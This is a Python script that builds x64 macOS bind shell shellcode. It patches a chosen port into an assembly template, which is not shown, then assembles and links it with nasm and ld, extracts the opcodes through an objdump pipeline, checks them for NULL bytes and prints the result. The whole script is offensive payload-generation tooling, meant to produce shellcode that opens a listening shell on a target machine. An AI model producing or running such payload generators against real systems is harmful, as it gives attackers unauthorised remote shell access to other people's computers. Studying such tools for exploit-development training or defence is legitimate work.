#!/usr/bin/python3

import argparse
import sys
import os
import socket

def set_port(lport):
	port = str(hex(socket.htons(lport)))
	port = port + "0201"
	asm = open("macOS_bind_shell_x64.asm", 'rt')
	data = asm.read()
	data = data.replace('PORT', port)
	asm.close()
	asm = open('bind-{}.asm'.format(lport), 'wt')
	asm.write(data)
	asm.close()

def gen_shellcode(port):
	stream = os.popen("""objdump -d ./bind-{}|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|tr -d '\n'|sed 's/^/"/'|sed 's/$/"/g'""".format(port))
	shellcode = stream.read().rstrip()
	shellcode = shellcode.replace("x", "\\x")
	return shellcode

def print_shellcode(shellcode, port):
	print("[*] Generating shellcode for x64 macOS bind shell on port %s" % port)
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print(shellcode)

def main():

	parser = argparse.ArgumentParser(description='Generate x64 macOS bind shell shellcode.')
	parser.add_argument('-p', '--port', type=int, help='Local port for TCP bind shell to listen on.')
	
	args = parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	# Modify the port in tcp_bind_shell.nasm
	set_port(args.port)
	
	# Link and assemble code
	os.system('nasm -f macho64 -o macOS_bind_shell_x64.o bind-{}.asm'.format(args.port))
	os.system('ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem macOS_bind_shell_x64.o -o bind-{}'.format(str(args.port)))
	
	# Dump the shellcode using objdump
	shellcode = gen_shellcode(args.port)

	# Print shellcode
	print_shellcode(shellcode, args.port)

	# Cleanup
	os.system('rm macOS_bind_shell_x64.o')

if __name__ == "__main__":
	main()
